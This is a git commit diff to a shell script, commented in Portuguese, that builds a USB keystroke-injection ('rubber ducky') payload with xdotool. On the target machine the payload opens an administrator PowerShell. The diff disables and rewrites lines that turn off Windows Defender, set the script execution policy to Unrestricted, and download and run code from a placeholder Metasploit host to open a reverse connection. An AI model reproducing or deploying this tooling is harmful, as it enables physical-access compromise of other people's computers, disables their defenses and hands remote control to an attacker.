5efc6492f2d7c9562b1927ad4a1170fcf80a05b2
hackealy <80939280+hackealy@users.noreply.github.com>
2023-04-28 15:50:20 -0300

    Update rubberduckycreator.sh

--- rubberduckycreator.sh
+++ rubberduckycreator.sh
@@ -26,17 +26,21 @@ echo "xdotool key super" >> script.sh # pressione a tecla do Windows
 echo "xdotool type 'powershell'" >> script.sh # digite "powershell"
 echo "xdotool key Return" >> script.sh # pressione a tecla Enter
 echo "xdotool type 'Start-Process powershell -Verb runAs'" >> script.sh # digite o comando para abrir o PowerShell como administrador
+echo "xdotool key Left" >> script.sh # pressione a tecla Left
 echo "xdotool key Return" >> script.sh # pressione a tecla Enter
 echo "xdotool type 'Start-Sleep -Seconds 5'" >> script.sh # Aguarda a janela do PowerShell abrir
 echo "xdotool key Return" >> script.sh # pressione a tecla Enter
-echo "xdotool type 'Set-ExecutionPolicy Unrestricted -Scope LocalMachin'" >> script.sh # Muda a Politica de Eecução de Scripts
-echo "xdotool key Return" >> script.sh # pressione a tecla Enter
-echo "xdotool type 'A'" >> script.sh # digite A
-echo "xdotool key Return" >> script.sh # pressione a tecla Enter
-echo "xdotool type '$uri = "http://[seu endereço IP]:[porta escolhida]/[caminho escolhido no Metasploit]"'" >> script.sh 
-echo "xdotool key Return" >> script.sh # pressione a tecla Enter
-echo "xdotool type '$uri = "Invoke-Expression ((New-Object Net.WebClient).DownloadString($uri))"'" >> script.sh  # Executa o comando para estabelecer a conexão reversa
-echo "xdotool key Return" >> script.sh # pressione a tecla Enter
+######################################################################################## Insersão dos Codigos para rodar no Powershell em modo admin:
+#echo "xdotool type 'Set-MpPreference -DisableRealtimeMonitoring $truen'" >> script.sh # Desativa o Windows Defender
+#echo "xdotool key Return" >> script.sh # pressione a tecla Enter
+#echo "xdotool type 'Set-ExecutionPolicy Unrestricted -Scope LocalMachin'" >> script.sh # Muda a Politica de Eecução de Scripts
+#echo "xdotool key Return" >> script.sh # pressione a tecla Enter
+#echo "xdotool type 'A'" >> script.sh # digite A
+#echo "xdotool key Return" >> script.sh # pressione a tecla Enter
+#echo "xdotool type '$uri = "http://[seu endereço IP]:[porta escolhida]/[caminho escolhido no Metasploit]"'" >> script.sh 
+#echo "xdotool key Return" >> script.sh # pressione a tecla Enter
+#echo "xdotool type '$uri = "Invoke-Expression ((New-Object Net.WebClient).DownloadString($uri))"'" >> script.sh  # Executa o comando para estabelecer a conexão reversa
+#echo "xdotool key Return" >> script.sh # pressione a tecla Enter
 
 # Copie o script para o dispositivo USB
 cp script.sh /media/user/USBDRIVE/
